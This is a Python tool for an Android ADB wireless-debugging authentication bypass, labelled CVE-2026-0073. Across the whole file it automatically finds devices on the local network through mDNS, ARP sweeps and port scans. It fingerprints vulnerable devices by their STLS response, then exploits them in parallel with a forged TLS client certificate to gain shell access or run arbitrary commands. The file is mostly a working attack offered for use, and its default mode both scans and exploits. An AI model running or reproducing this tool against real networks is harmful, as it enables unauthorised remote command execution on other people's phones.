#!/usr/bin/env python3
"""
CVE-2026-0073 — Android adbd EVP_PKEY_cmp Network Scanner + Exploit Orchestrator

Scans the local network for Android devices with vulnerable ADB-over-TCP
(Wireless Debugging) services. Uses mDNS discovery as primary identification,
falls back to ARP sweep + port scan, then exploits confirmed vulnerable targets.

Modes:
  --scan        Scan local network, identify vulnerable devices, exploit them
  --host HOST   Direct single-target exploit (skips scanning)
  --scan --no-exploit   Scan only, don't exploit (recon mode)

Discovery pipeline:
  1. Subnet detection   — detect local IP, netmask, CIDR via netifaces / ip
  2. mDNS listener      — listen for _adb-tls-connect._tcp (paired ADB devices)
  3. ARP sweep fallback — scapy.arping / nmap -sn if mDNS finds nothing
  4. Port scan          — TCP connect to each alive host on candidate ports
  5. ADB protocol probe — send CNXN, check response for STLS (vulnerable)

Usage:
  source .venv/bin/activate
  python3 adbt_scanner.py --scan
  python3 adbt_scanner.py --scan --ports 5555,5580
  python3 adbt_scanner.py --scan --subnet 192.168.2.0/24
  python3 adbt_scanner.py --scan --cmd "id; getprop ro.product.model"
  python3 adbt_scanner.py --host 192.168.1.42 --cmd "whoami"

Dependencies (installed via uv pip):
  cryptography, zeroconf, scapy, netifaces
"""

import argparse
import concurrent.futures
import ipaddress
import os
import re
import socket
import subprocess
import sys
import textwrap
import threading
import time

# ── Optional imports with graceful degradation ────────────────────────────

try:
    import netifaces
    HAS_NETIFACES = True
except ImportError:
    HAS_NETIFACES = False

try:
    from zeroconf import ServiceBrowser, ServiceListener, Zeroconf
    HAS_ZEROCONF = True
except ImportError:
    HAS_ZEROCONF = False

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ── Import from sibling exploit module ────────────────────────────────────

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from adb_tls_auth_bypass import (  # noqa: E402
    ADBBypass,
    pack_packet,
    recv_packet,
    CMD_CNXN,
    CMD_STLS,
    CMD_AUTH,
    ADB_VERSION,
    ADB_MAXDATA,
    ADB_BANNER,
    make_ec_client_cert,
)

# ── Constants ─────────────────────────────────────────────────────────────

DEFAULT_PORT = 5555
DEFAULT_PORTS = [5555]
DEFAULT_MDNS_TIMEOUT = 30
DEFAULT_ARP_TIMEOUT = 3
DEFAULT_CONNECT_TIMEOUT = 2.0
DEFAULT_PROBE_TIMEOUT = 3.0
MAX_EXPLOIT_WORKERS = 10
MAX_PORTSCAN_WORKERS = 60

SEPARATOR = "─" * 64


# ═══════════════════════════════════════════════════════════════════════════
#  Utilities
# ═══════════════════════════════════════════════════════════════════════════

def _check_root() -> bool:
    """Return True if the process has raw-socket privileges."""
    if os.name == "nt":
        return True
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


# ═══════════════════════════════════════════════════════════════════════════
#  Subnet detection
# ═══════════════════════════════════════════════════════════════════════════

def _find_default_iface_linux() -> tuple[str, str, str]:
    """Return (interface, ip, cidr) by parsing ``ip route`` + ``ip addr``."""
    try:
        route = subprocess.run(
            ["ip", "-4", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        match = re.search(r"dev\s+(\S+)", route.stdout)
        if not match:
            raise RuntimeError("no default route found")
        iface = match.group(1)

        addr_out = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        )
        match2 = re.search(r"inet\s+(\S+)", addr_out.stdout)
        if not match2:
            raise RuntimeError(f"no IPv4 address on {iface}")
        ip_slash_cidr = match2.group(1)
        return iface, *ip_slash_cidr.split("/")
    except Exception as e:
        raise RuntimeError(f"subnet detection failed: {e}")


def _find_default_iface_netifaces() -> tuple[str, str, str]:
    """Return (interface, ip, cidr) using netifaces."""
    gws = netifaces.gateways()
    default = gws.get("default", {}).get(netifaces.AF_INET)
    if not default:
        raise RuntimeError("no default gateway found via netifaces")
    _gw_ip, iface = default
    iface_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET)
    if not iface_info:
        raise RuntimeError(f"no IPv4 address for {iface}")
    ip = iface_info[0]["addr"]
    netmask = iface_info[0]["netmask"]
    cidr = ipaddress.IPv4Network(f"0.0.0.0/{netmask}", strict=False).prefixlen
    return iface, ip, str(cidr)


def _find_default_iface_socket() -> tuple[str, str, str]:
    """Fallback: guess /24 from hostname. Least reliable."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return "unknown", ip, "24"
    except OSError:
        try:
            ip = socket.gethostbyname(socket.gethostname())
            return "unknown", ip, "24"
        except socket.gaierror:
            raise RuntimeError("cannot determine local IP address")


def detect_subnet(override: str | None = None):
    """Return (interface: str, ip: str, cidr: int, network: IPv4Network).

    When *override* is given (CIDR string), it is used directly without
    auto-detection.
    """
    if override:
        network = ipaddress.IPv4Network(override, strict=False)
        return "custom", str(network.network_address), network.prefixlen, network

    errors = []
    for name, fn in [
        ("netifaces", _find_default_iface_netifaces),
        ("iproute2", _find_default_iface_linux),
        ("socket",    _find_default_iface_socket),
    ]:
        try:
            iface, ip_str, cidr_str = fn()
            cidr = int(cidr_str)
            network = ipaddress.IPv4Network(f"{ip_str}/{cidr}", strict=False)
            return iface, ip_str, cidr, network
        except Exception as e:
            errors.append(f"  {name}: {e}")
    raise RuntimeError(
        "Could not detect local subnet. "
        "Install netifaces, iproute2, or provide --host directly.\n"
        + "\n".join(errors)
    )


# ═══════════════════════════════════════════════════════════════════════════
#  mDNS discovery  (_adb-tls-connect._tcp)
# ═══════════════════════════════════════════════════════════════════════════

class ADBTLSListener(ServiceListener):

    def __init__(self):
        self._lock = threading.Lock()
        self.devices: list[tuple[str, int]] = []

    def add_service(self, zc: Zeroconf, type_: str, name: str):
        info = zc.get_service_info(type_, name)
        if info is None:
            return
        try:
            addrs = (info.parsed_addresses()
                     if hasattr(info, "parsed_addresses")
                     else [socket.inet_ntoa(a) for a in info.addresses])
        except Exception:
            return
        port = info.port or DEFAULT_PORT
        with self._lock:
            for addr in addrs:
                candidate = (addr, port)
                if candidate not in self.devices:
                    self.devices.append(candidate)

    def remove_service(self, zc, type_, name):
        pass

    def update_service(self, zc, type_, name):
        pass


def discover_mdns(timeout: float, verbose: bool) -> list[tuple[str, int]]:
    if not HAS_ZEROCONF:
        print("  [warn] zeroconf not installed — skipping mDNS.")
        print("         pip install zeroconf")
        return []

    listener = ADBTLSListener()
    zc = None
    browser = None
    try:
        zc = Zeroconf()
        browser = ServiceBrowser(zc, "_adb-tls-connect._tcp.local.", listener)

        if verbose:
            print(f"  mDNS: listening for _adb-tls-connect._tcp ({timeout}s) ...")

        time.sleep(timeout)
    finally:
        if browser is not None:
            browser.cancel()
        if zc is not None:
            zc.close()

    devices = listener.devices
    if verbose:
        print(f"  mDNS: {len(devices)} device(s) discovered")
    return devices


# ═══════════════════════════════════════════════════════════════════════════
#  ARP sweep  (scapy → nmap)
# ═══════════════════════════════════════════════════════════════════════════

def _arp_sweep_nmap(subnet: ipaddress.IPv4Network, timeout: int) -> list[str]:
    cmd = ["nmap", "-sn", "-T5", str(subnet)]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True,
                                timeout=timeout * 2)
        hosts = re.findall(r"Nmap scan report for (\S+)", result.stdout)
        return [h for h in hosts if ipaddress.ip_address(h) in subnet]
    except Exception:
        return []


def _arp_sweep_scapy(subnet: ipaddress.IPv4Network, timeout: int) -> list[str]:
    try:
        ans, _ = scapy.arping(str(subnet), timeout=timeout, verbose=0)
        return [recv.psrc for _, recv in ans]
    except Exception:
        return []


def arp_sweep(network: ipaddress.IPv4Network, timeout: int,
              verbose: bool) -> list[str]:
    if HAS_SCAPY:
        has_root = _check_root()
        if not has_root:
            if verbose:
                print("  [warn] scapy needs root / CAP_NET_RAW; "
                      "falling back to nmap")
        else:
            if verbose:
                print(f"  ARP: scapy.arping {network} ...")
            hosts = _arp_sweep_scapy(network, timeout)
            if hosts:
                if verbose:
                    print(f"  ARP: {len(hosts)} live host(s)")
                return hosts

    if verbose:
        print(f"  ARP: nmap -sn {network} ...")
    hosts = _arp_sweep_nmap(network, timeout)
    if hosts:
        if verbose:
            print(f"  ARP: {len(hosts)} live host(s)")
        return hosts

    if verbose:
        print("  ARP: no live hosts found")
    return []


# ═══════════════════════════════════════════════════════════════════════════
#  Port scanning  (TCP connect scan)
# ═══════════════════════════════════════════════════════════════════════════

def _tcp_connect(host: str, port: int, timeout: float) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def scan_ports(hosts: list[str], ports: list[int], timeout: float = 1.0,
               verbose: bool = False) -> list[tuple[str, int]]:
    results: list[tuple[str, int]] = []
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=min(len(hosts) * len(ports) or 1, MAX_PORTSCAN_WORKERS),
    ) as pool:
        futures = {
            pool.submit(_tcp_connect, host, port, timeout): (host, port)
            for host in hosts
            for port in ports
        }
        for future in concurrent.futures.as_completed(futures):
            host, port = futures[future]
            try:
                if future.result():
                    results.append((host, port))
                    if verbose:
                        print(f"    port {port} open on {host}")
            except Exception:
                pass
    if verbose:
        print(f"  Port scan: {len(results)} open port(s)")
    return results


# ═══════════════════════════════════════════════════════════════════════════
#  ADB protocol probe  (CNXN → check response command)
# ═══════════════════════════════════════════════════════════════════════════

def probe_adb(host: str, port: int, timeout: float) -> tuple[str, str]:
    """
    Send ADB CNXN, classify response.

    Returns (category, detail) where *category* is one of:
        "VULNERABLE"  —  STLS response; TLS auth path reachable
        "OPEN"        —  CNXN response; ADB open, no auth
        "LEGACY"      —  AUTH response; legacy ADB auth
        "UNKNOWN"     —  unrecognised ADB command
        "NO_ADB"      —  no valid ADB response
        "ERROR"       —  probe exception
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        cnxn = pack_packet(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER)
        sock.sendall(cnxn)
        cmd, arg0, _arg1, data = recv_packet(sock)
        sock.close()

        if cmd == CMD_STLS:
            return ("VULNERABLE", f"STLS v{arg0:#x}")
        elif cmd == CMD_AUTH:
            return ("LEGACY", f"AUTH type={arg0:#x}")
        elif cmd == CMD_CNXN:
            banner = ""
            try:
                banner = data.decode(errors="replace").rstrip("\x00")
            except Exception:
                pass
            return ("OPEN", f"open (no auth) — {banner[:40]}")
        else:
            return ("UNKNOWN", f"cmd={cmd:#010x}")

    except (socket.timeout, ConnectionRefusedError, OSError, ConnectionError,
            ValueError, RuntimeError):
        return ("NO_ADB", "no ADB response")


# ═══════════════════════════════════════════════════════════════════════════
#  Exploitation  (run against confirmed vulnerable targets)
# ═══════════════════════════════════════════════════════════════════════════

def exploit_single(host: str, port: int, cert_pem: bytes, key_pem: bytes,
                   cmd: str | None, verbose: bool) -> dict:
    """Run the full exploit chain against a single target. Thread-safe.

    Returns a dict with keys: host, port, success, output, error,
    and optionally bypass_obj (when no *cmd* and interactive was selected).
    """
    result: dict = {
        "host": host, "port": port, "success": False,
        "output": "", "error": "",
    }
    bypass = ADBBypass(host, port, verbose=verbose)
    try:
        bypass.connect()
        bypass.upgrade_tls(cert_pem, key_pem)
        bypass.post_tls_cnxn()

        if cmd:
            output = bypass.run_command(cmd)
            result["output"] = output
        else:
            bypass.open_shell()
            result["bypass_obj"] = bypass

        result["success"] = True
    except Exception as e:
        result["error"] = str(e)
    finally:
        if not result.get("bypass_obj"):
            bypass.close()
    return result


def exploit_targets(targets: list[tuple[str, int]], cmd: str | None,
                    verbose: bool) -> list[dict]:
    if not targets:
        return []

    print(f"\n  Exploiting {len(targets)} target(s) ...")
    cert_pem, key_pem = make_ec_client_cert()

    results: list[dict] = []
    real_workers = min(len(targets), MAX_EXPLOIT_WORKERS)
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=real_workers,
    ) as pool:
        futures = {
            pool.submit(
                exploit_single, host, port, cert_pem, key_pem, cmd, verbose,
            ): (host, port)
            for host, port in targets
        }
        for future in concurrent.futures.as_completed(futures):
            host, port = futures[future]
            try:
                res = future.result()
            except Exception as e:
                res = {"host": host, "port": port, "success": False,
                       "error": str(e), "output": ""}
            results.append(res)
            status = "✓" if res["success"] else "✗"
            print(f"    {host}:{port}  {status}")

    return results


# ═══════════════════════════════════════════════════════════════════════════
#  Output / formatting
# ═══════════════════════════════════════════════════════════════════════════

def _pad(s: str, width: int) -> str:
    return s + " " * max(0, width - len(s))


def _print_header(title: str, file=sys.stdout):
    print(f"\n{'=' * 64}", file=file)
    print(f" {title}", file=file)
    print(f"{'=' * 64}", file=file)


def _print_section(label: str, file=sys.stdout):
    print(f"\n[{label}]", file=file)


def print_banner(iface: str, ip_str: str, cidr: int):
    _print_header("CVE-2026-0073 — Android ADB Network Scanner")
    print(f" Subnet: {ip_str}/{cidr}  (iface: {iface})")
    print(f"{'=' * 64}")


def print_probe_table(probe_results: list[dict]):
    if not probe_results:
        print("  (no candidates to probe)")
        return

    widths = [20, 8, 12, 30]
    headers = ["Host", "Port", "Response", "Detail"]
    divider = "┼".join(SEPARATOR[:w] if i else "─" * w
                       for i, w in enumerate(widths))

    print(f"  ┌{'─'.join('─' * w for w in widths)}┐")
    print(f"  │ {' │ '.join(_pad(h, widths[i]) for i, h in enumerate(headers))} │")

    for r in probe_results:
        print(f"  ├{divider}┤")
        row = [
            r.get("host", "?"),
            str(r.get("port", "?")),
            r.get("response", "?"),
            r.get("detail", "")[:29],
        ]
        print(f"  │ {' │ '.join(_pad(row[i], widths[i]) for i in range(4))} │")

    print(f"  └{'─'.join('─' * w for w in widths)}┘")

    vuln_count = sum(1 for r in probe_results if r.get("response") == "VULNERABLE")
    total = len(probe_results)
    print(f"  Summary: {vuln_count}/{total} vulnerable (STLS path)")


def print_exploit_results(results: list[dict], cmd: str | None):
    if not results:
        return

    _print_section("Exploit Results")
    successes = [r for r in results if r["success"]]
    failures = [r for r in results if not r["success"]]

    print(f"  Successful: {len(successes)}  |  Failed: {len(failures)}")

    for r in successes:
        header = f"  {SEPARATOR}"
        print(f"\n{header}")
        print(f"  {r['host']}:{r['port']}  ✓  SHELL ACCESS")
        print(f"{header}")
        if r.get("output"):
            for line in r["output"].splitlines():
                print(f"    {line}")
        print(f"{header}")

    for r in failures:
        print(f"\n  {r['host']}:{r['port']}  ✗  {r.get('error', 'unknown')[:100]}")


def pick_interactive(results: list[dict]):
    """If multiple devices were exploited, let user pick for interactive shell."""
    successes = [r for r in results if r.get("success")]
    if not successes:
        return

    bypass_obj = None
    if len(successes) == 1:
        bypass_obj = successes[0].get("bypass_obj")
    else:
        print("\n  Multiple devices available:")
        for i, r in enumerate(successes, 1):
            print(f"    {i}. {r['host']}:{r['port']}")
        try:
            choice = input(
                "  Select device (1-{} / q): ".format(len(successes))
            ).strip()
            if choice.lower() == "q":
                return
            idx = int(choice) - 1
            if 0 <= idx < len(successes):
                bypass_obj = successes[idx].get("bypass_obj")
        except (ValueError, EOFError):
            pass

    if bypass_obj:
        try:
            bypass_obj.interactive_shell()
        except KeyboardInterrupt:
            print()
        finally:
            bypass_obj.close()

    for r in successes:
        obj = r.get("bypass_obj")
        if obj and obj is not bypass_obj:
            obj.close()


# ═══════════════════════════════════════════════════════════════════════════
#  Mode 0 — direct single-target exploit
# ═══════════════════════════════════════════════════════════════════════════

def mode_direct(host: str, port: int, cmd: str | None, verbose: bool):
    """Single-target exploit, same behaviour as original PoC."""
    cert_pem, key_pem = make_ec_client_cert()

    bypass = ADBBypass(host, port, verbose=verbose)
    try:
        bypass.connect()
        bypass.upgrade_tls(cert_pem, key_pem)
        bypass.post_tls_cnxn()

        if cmd:
            output = bypass.run_command(cmd)
            print(output, end="")
        else:
            bypass.open_shell()
            bypass.interactive_shell()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[-] {e}", file=sys.stderr)
        sys.exit(1)
    finally:
        bypass.close()


# ═══════════════════════════════════════════════════════════════════════════
#  Mode 1 — scan network → probe → exploit
# ═══════════════════════════════════════════════════════════════════════════

def mode_scan(args):
    """Full pipeline: subnet → mDNS → ARP → port scan → probe → exploit."""
    try:
        _mode_scan_impl(args)
    except KeyboardInterrupt:
        print("\n  [*] scan interrupted by user", file=sys.stderr)


def _mode_scan_impl(args):
    iface, ip_str, cidr, network = detect_subnet(args.subnet)
    print_banner(iface, ip_str, cidr)
    scan_ports_list = args.ports if args.scan_ports_given else DEFAULT_PORTS

    # ── Step 1: Discovery ──────────────────────────────────────────────
    _print_section("Discovery")

    if not HAS_ZEROCONF and not args.no_mdns:
        print("  [warn] zeroconf not available — mDNS will be skipped")
    if not HAS_SCAPY and not args.no_arp:
        print("  [warn] scapy not available — using nmap for ARP sweep")
    if not _check_root() and HAS_SCAPY and not args.no_arp:
        print("  [warn] not running as root — scapy ARP scan will be skipped")

    candidates: set[tuple[str, int]] = set()

    # mDNS
    if not args.no_mdns:
        mdns_devices = discover_mdns(args.mdns_timeout, args.verbose)
        for dev in mdns_devices:
            candidates.add(dev)

    # ARP sweep (only if mDNS found nothing)
    if not args.no_arp and not candidates:
        live_hosts = arp_sweep(network, args.arp_timeout, args.verbose)
        if live_hosts:
            port_results = scan_ports(
                live_hosts, scan_ports_list,
                args.connect_timeout, args.verbose,
            )
            for pr in port_results:
                candidates.add(pr)

    # Direct port scan on whole subnet as last resort
    if not args.no_arp and not candidates:
        if cidr >= 24:
            all_hosts = [str(h) for h in network.hosts()
                         if h != network.network_address
                         and h != network.broadcast_address]
            if args.verbose:
                print(f"  Direct port scan: {len(all_hosts)} IPs "
                      f"on ports {scan_ports_list} ...")
            port_results = scan_ports(
                all_hosts, scan_ports_list,
                args.connect_timeout, args.verbose,
            )
            for pr in port_results:
                candidates.add(pr)
        else:
            print("  [warn] subnet too large for direct port scan "
                  f"(/{cidr}). Use --subnet to narrow, or --host for "
                  "specific targets.")

    if not candidates:
        print("\n  No ADB candidates found on the network.")
        return

    print(f"\n  Total candidates for probing: {len(candidates)}")

    # ── Step 2: ADB Protocol Probe ─────────────────────────────────────
    _print_section("ADB Protocol Probe")
    print(f"  Probing {len(candidates)} candidate(s) ...")

    probe_results: list[dict] = []
    vulnerable: list[tuple[str, int]] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
        futures_to_target = {
            pool.submit(
                probe_adb, host, port, args.probe_timeout,
            ): (host, port)
            for host, port in candidates
        }
        for future in concurrent.futures.as_completed(futures_to_target):
            host, port = futures_to_target[future]
            try:
                category, detail = future.result()
            except Exception:
                category, detail = "ERROR", "probe exception"
            probe_results.append({
                "host": host, "port": port, "response": category,
                "detail": detail,
            })
            if category == "VULNERABLE":
                vulnerable.append((host, port))

    order = {
        "VULNERABLE": 0, "OPEN": 1, "LEGACY": 2,
        "UNKNOWN": 3, "NO_ADB": 4, "ERROR": 5,
    }
    probe_results.sort(key=lambda r: (order.get(r.get("response", ""), 99),
                                       r.get("host", "")))

    print_probe_table(probe_results)

    # ── Step 3: Exploitation ───────────────────────────────────────────
    if args.no_exploit:
        print("\n  [*] --no-exploit set; stopping after probe phase.")
        return

    if not vulnerable:
        print("\n  No vulnerable (STLS) targets to exploit.")
        return

    _print_section("Exploitation")

    results = exploit_targets(vulnerable, args.cmd, args.verbose)
    print_exploit_results(results, args.cmd)

    if not args.cmd:
        pick_interactive(results)


# ═══════════════════════════════════════════════════════════════════════════
#  CLI entry point
# ═══════════════════════════════════════════════════════════════════════════

def _parse_ports(port_str: str) -> list[int]:
    parts = [p.strip() for p in port_str.split(",") if p.strip()]
    return [int(p) for p in parts]


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-0073 — Android adbd EVP_PKEY_cmp TLS auth bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s --scan
              %(prog)s --scan --ports 5555,5580
              %(prog)s --scan --subnet 192.168.2.0/24
              %(prog)s --scan --cmd "id; getprop ro.product.model"
              %(prog)s --scan --mdns-timeout 45 --no-exploit
              %(prog)s --host 192.168.1.42
              %(prog)s --host 192.168.1.42 --cmd "whoami"
        """),
    )

    # Mode selection
    parser.add_argument(
        "--scan", action="store_true",
        help="Scan local network for vulnerable devices and exploit them",
    )
    parser.add_argument(
        "--host", metavar="HOST",
        help="Direct single-target exploit (skips scanning)",
    )
    parser.add_argument(
        "--port", type=int, default=DEFAULT_PORT,
        help=f"ADB TCP port for --host mode (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "--cmd", metavar="COMMAND",
        help="Shell command to run (default: interactive shell)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )

    # Discovery options
    parser.add_argument(
        "--mdns-timeout", type=float, default=DEFAULT_MDNS_TIMEOUT,
        help=f"Seconds to listen for mDNS (default: {DEFAULT_MDNS_TIMEOUT})",
    )
    parser.add_argument(
        "--ports", type=_parse_ports, default=None,
        help=(
            "Ports to scan in --scan mode, comma-separated "
            f"(default: {DEFAULT_PORT})"
        ),
    )
    parser.add_argument(
        "--subnet", metavar="CIDR",
        help=(
            "Override detected subnet (e.g. 192.168.2.0/24). "
            "Useful on multi-homed hosts."
        ),
    )
    parser.add_argument(
        "--connect-timeout", type=float, default=DEFAULT_CONNECT_TIMEOUT,
        help=f"TCP connect timeout in seconds (default: {DEFAULT_CONNECT_TIMEOUT})",
    )
    parser.add_argument(
        "--probe-timeout", type=float, default=DEFAULT_PROBE_TIMEOUT,
        help=f"ADB probe timeout in seconds (default: {DEFAULT_PROBE_TIMEOUT})",
    )
    parser.add_argument(
        "--arp-timeout", type=int, default=DEFAULT_ARP_TIMEOUT,
        help=f"ARP sweep timeout in seconds (default: {DEFAULT_ARP_TIMEOUT})",
    )
    parser.add_argument(
        "--no-mdns", action="store_true",
        help="Skip mDNS discovery phase",
    )
    parser.add_argument(
        "--no-arp", action="store_true",
        help="Skip ARP sweep + port scan phase",
    )
    parser.add_argument(
        "--no-exploit", action="store_true",
        help="Do not run exploits; stop after ADB protocol probe",
    )

    args = parser.parse_args()

    # ── Sanity checks ──────────────────────────────────────────────────
    if not args.scan and not args.host:
        parser.error("must specify --scan or --host")
    if args.scan and args.host:
        parser.error("--scan and --host are mutually exclusive")

    # Track whether --ports was explicitly passed
    args.scan_ports_given = args.ports is not None

    # ── Delegate ───────────────────────────────────────────────────────
    if args.host:
        mode_direct(args.host, args.port, args.cmd, args.verbose)
    elif args.scan:
        mode_scan(args)


if __name__ == "__main__":
    main()
